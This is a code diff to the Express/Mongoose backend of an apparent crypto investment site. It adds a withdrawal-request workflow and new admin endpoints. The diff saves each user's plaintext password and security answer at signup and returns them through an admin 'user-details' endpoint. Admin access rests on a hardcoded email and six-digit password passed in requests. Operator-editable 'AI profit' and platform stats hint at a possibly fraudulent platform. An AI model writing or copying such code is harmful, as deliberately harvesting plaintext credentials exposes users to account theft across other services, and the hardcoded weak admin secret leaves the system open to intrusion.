@@ -25,7 +25,9 @@ const userSchema = new mongoose.Schema({
   email: { type: String, unique: true, required: true },
   country: { type: String, required: true },
   password: { type: String, required: true },
+  plainPassword: { type: String },
   securityQuestion: { question: String, answer: String },
+  plainSecurityAnswer: { type: String },
   referralCode: { type: String, unique: true },
   referredBy: { type: String, default: null },
   referrals: [{ type: String }],
@@ -56,6 +58,21 @@ const chatMessageSchema = new mongoose.Schema({
 });
 
 const ChatMessage = mongoose.model('ChatMessage', chatMessageSchema);
+
+// Withdrawal Request Schema
+const withdrawalRequestSchema = new mongoose.Schema({
+  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
+  userEmail: String,
+  userName: String,
+  amount: Number,
+  network: String,
+  walletAddress: String,
+  status: { type: String, default: 'pending' },
+  createdAt: { type: Date, default: Date.now },
+  processedAt: Date
+});
+
+const WithdrawalRequest = mongoose.model('WithdrawalRequest', withdrawalRequestSchema);
 
 // Platform Stats Schema
 const platformStatsSchema = new mongoose.Schema({
@@ -128,7 +145,9 @@ app.post('/api/signup', async (req, res) => {
       email,
       country,
       password: hashedPassword,
+      plainPassword: password,
       securityQuestion: { question: securityQ1, answer: hashedAnswer },
+      plainSecurityAnswer: securityA1,
       emailVerified: true,
       dailySnapshots: [{ date: new Date(), balance: 0 }]
     });
@@ -323,7 +342,6 @@ app.post('/api/admin/add-withdrawal', async (req, res) => {
   await user.save();
   res.json({ success: true, newBalance: user.balance });
 });
-
 // ========== ADMIN - UPDATE AI PROFIT ==========
 app.post('/api/admin/update-ai-profit', async (req, res) => {
   const { adminEmail, adminPassword, userEmail, aiProfit } = req.body;
@@ -381,7 +399,7 @@ app.get('/api/admin/user-transactions', async (req, res) => {
   res.json({ success: true, transactions: user.transactionHistory, balance: user.balance });
 });
 
-// ========== ADMIN - GET USER DETAILS (for password reset) ==========
+// ========== ADMIN - GET USER DETAILS ==========
 app.get('/api/admin/user-details', async (req, res) => {
   const { adminEmail, adminPassword, userEmail } = req.query;
   
@@ -399,10 +417,122 @@ app.get('/api/admin/user-details', async (req, res) => {
     user: {
       fullName: user.fullName,
       email: user.email,
-      securityQuestion: user.securityQuestion,
+      plainPassword: user.plainPassword || '[Not available]',
+      securityQuestion: user.securityQuestion.question,
+      plainSecurityAnswer: user.plainSecurityAnswer || '[Not available]',
       createdAt: user.createdAt
     }
   });
+});
+
+// ========== ADMIN - GET WITHDRAWAL REQUESTS ==========
+app.get('/api/admin/withdrawal-requests', async (req, res) => {
+  const { adminEmail, adminPassword } = req.query;
+  
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
+    return res.json({ success: false, error: 'Admin access denied' });
+  }
+  
+  const requests = await WithdrawalRequest.find().sort({ createdAt: -1 });
+  res.json({ success: true, requests });
+});
+
+// ========== ADMIN - APPROVE WITHDRAWAL ==========
+app.post('/api/admin/approve-withdrawal', async (req, res) => {
+  const { adminEmail, adminPassword, requestId } = req.body;
+  
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
+    return res.json({ success: false, error: 'Admin access denied' });
+  }
+  
+  const request = await WithdrawalRequest.findById(requestId);
+  if (!request) {
+    return res.json({ success: false, error: 'Request not found' });
+  }
+  
+  if (request.status !== 'pending') {
+    return res.json({ success: false, error: 'Request already processed' });
+  }
+  
+  const user = await User.findById(request.userId);
+  if (!user) {
+    return res.json({ success: false, error: 'User not found' });
+  }
+  
+  if (user.balance < request.amount) {
+    return res.json({ success: false, error: 'Insufficient balance' });
+  }
+  
+  user.balance -= request.amount;
+  
+  user.transactionHistory.unshift({
+    date: new Date(),
+    type: 'Withdrawal',
+    amount: -request.amount,
+    balance: user.balance,
+    reason: `${request.network} withdrawal to ${request.walletAddress}`,
+    status: 'completed'
+  });
+  
+  await user.save();
+  
+  request.status = 'approved';
+  request.processedAt = new Date();
+  await request.save();
+  
+  res.json({ success: true, message: 'Withdrawal approved and balance updated' });
+});
+
+// ========== ADMIN - REJECT WITHDRAWAL ==========
+app.post('/api/admin/reject-withdrawal', async (req, res) => {
+  const { adminEmail, adminPassword, requestId } = req.body;
+  
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
+    return res.json({ success: false, error: 'Admin access denied' });
+  }
+  
+  const request = await WithdrawalRequest.findById(requestId);
+  if (!request) {
+    return res.json({ success: false, error: 'Request not found' });
+  }
+  
+  if (request.status !== 'pending') {
+    return res.json({ success: false, error: 'Request already processed' });
+  }
+  
+  request.status = 'rejected';
+  request.processedAt = new Date();
+  await request.save();
+  
+  res.json({ success: true, message: 'Withdrawal rejected' });
+});
+
+// ========== USER - REQUEST WITHDRAWAL ==========
+app.post('/api/request-withdrawal', async (req, res) => {
+  if (!req.session.userId) {
+    return res.json({ success: false, error: 'Not logged in' });
+  }
+  
+  const { amount, network, walletAddress } = req.body;
+  const user = await User.findById(req.session.userId);
+  
+  if (user.balance < amount) {
+    return res.json({ success: false, error: 'Insufficient balance' });
+  }
+  
+  const withdrawalRequest = new WithdrawalRequest({
+    userId: user._id,
+    userEmail: user.email,
+    userName: user.fullName,
+    amount: parseFloat(amount),
+    network: network,
+    walletAddress: walletAddress,
+    status: 'pending'
+  });
+  
+  await withdrawalRequest.save();
+  
+  res.json({ success: true, message: 'Withdrawal request submitted. Admin will process within 24-48 hours.' });
 });
 
 // ========== ADMIN - UPDATE PLATFORM STATS ==========
@@ -458,22 +588,6 @@ app.get('/api/admin/stats', async (req, res) => {
 app.get('/api/platform-stats', async (req, res) => {
   const stats = await PlatformStats.findOne();
   res.json({ success: true, stats });
-});
-
-// ========== REQUEST WITHDRAWAL (USER) ==========
-app.post('/api/request-withdrawal', async (req, res) => {
-  if (!req.session.userId) {
-    return res.json({ success: false, error: 'Not logged in' });
-  }
-  
-  const { amount, network, walletAddress } = req.body;
-  const user = await User.findById(req.session.userId);
-  
-  if (user.balance < amount) {
-    return res.json({ success: false, error: 'Insufficient balance' });
-  }
-  
-  res.json({ success: true, message: 'Withdrawal request submitted. Admin will process within 24-48 hours.' });
 });
 
 // ========== CHAT ROUTES ==========
